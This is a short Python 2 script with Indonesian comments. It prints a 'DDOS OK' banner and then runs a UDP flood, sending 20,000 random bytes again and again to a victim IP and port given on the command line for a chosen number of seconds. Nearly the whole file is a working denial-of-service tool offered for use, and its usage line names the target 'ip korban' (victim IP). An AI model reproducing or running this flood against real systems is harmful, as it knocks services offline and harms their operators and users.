import time
import socket
import random
import sys
def usage():
    print "\033[1;32m_____   _____    _____    _        _____  _    _" 
    print "\033[1;32m(____ \ (____ \  / ___ \  | |      / ___ \| |  / )"
    print "\033[1;32m _   \ \ _   \ \| |   | |  \ \    | |   | | | / /" 
    print "\033[1;32m| |   | | |   | | |   | |   \ \   | |   | | |< <"  
    print "\033[1;32m| |__/ /| |__/ /| |___| |____) )  | |___| | | \ \ "
    print "\033[1;32m|_____/ |_____/  \_____(______/    \_____/|_|  \_)"
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.1)
#ubah angka 0.1 sesuai keinginan kamu
#angka terkecil adalah yang paling cepat
#angka terbesar adalah yang paling lambat
mengetik('\033[1;91mcontoh python2 ddosok.py (ip korban) 80 135 sampe sini paham?')
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

